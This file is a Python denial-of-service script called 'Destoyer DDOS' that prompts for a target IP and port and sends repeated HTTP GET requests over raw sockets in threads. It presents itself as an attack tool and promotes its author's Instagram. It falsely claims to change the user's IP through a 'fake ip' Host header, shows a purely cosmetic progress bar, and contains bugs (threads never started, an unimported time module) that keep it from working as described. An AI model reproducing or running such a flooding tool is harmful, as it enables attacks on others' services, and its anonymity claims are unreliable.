import os,pyfiglet,random
import threading
import socket
from time import sleep
black='\033[30m'
red='\033[31m'
green='\033[32m'
orange='\033[33m'
blue='\033[34m'
purple='\033[35m'
cyan='\033[36m'
lightgrey='\033[37m'
darkgrey='\033[90m'
lightred='\033[91m'
lightgreen='\033[92m'
yellow='\033[93m'
lightblue='\033[94m'
pink='\033[95m'
lightcyan='\033[96m'
all_col = [red,green,orange,cyan,lightgrey,lightred,lightgreen,yellow,lightcyan]
ran = random.choice(all_col)
os.system("clear")
name = pyfiglet.figlet_format("Destoyer")
d = pyfiglet.figlet_format("DDOS")

print(f"{ran}{name}")
ran2 = random.choice(all_col)
print(f"{ran2}{d}")
ran3 = random.choice(all_col)
print("-"*20,"\n")
print(f"{ran3}",("  "*3),"[+] Follow me on instagram @saadkhan041\n\n[+] V_1.0\n\n")
ran4 = random.choice(all_col)
cont = ""
while cont!= "n" and "no":
    
    target = input("Enter Target ip: ")
    try:

        port = int(input(f"{ran4}Enter port number [default port is 80]: "))
    except ValueError:
        port = 80
        print(f"{ran3}Port 80 is selected ")
    else:
        print(f"{ran}{port}is selected! ")

    fake_ip = input(f"{ran}Type fake ip to hide your identity: ")

    range_of_req = int(input(f"{ran2}Enter the ramge of requests: "))

    def ddos(port=80):
        try:
            stream = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            stream.connect((target,port))
            stream.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"),(target,port))
            stream.sendto(f"HOST: {fake_ip}\r\n\r\n".encode("ascii"),(target,port))
            stream.close
        except ValueError:
            port =80
            print(f"{ran4}You skipped the name of port :-(")

        except KeyboardInterrupt:
            print(f"{ran}Have a Good Day :-)")

        
        

    ddos(port)
    os.system("clear")
    print(lightblue , "Changing Your ip to:",fake_ip)
    print(cyan , "Connecting to port! ")
    os.system("figlet Attack Starting")

    for i in range(range_of_req):
        thr = threading.Thread(target=ddos)
        thr.start

    print(ran,"[                    ] 0% ")
    time.sleep(5)
    print(ran2,"[=====               ] 25%")
    time.sleep(5)
    print(ran3,"[==========          ] 50%")
    time.sleep(5)
    print(ran4,"[===============     ] 75%")
    time.sleep(5)
    print(cyan,"[====================] 100%")
    time.sleep(3)

    print(f"{ran4}\n\n\r[+] DDOS done successfully! \n\n")
    cont = input(f"{ran4}[-]Do You want to continue? [y/n]: ").lower

    




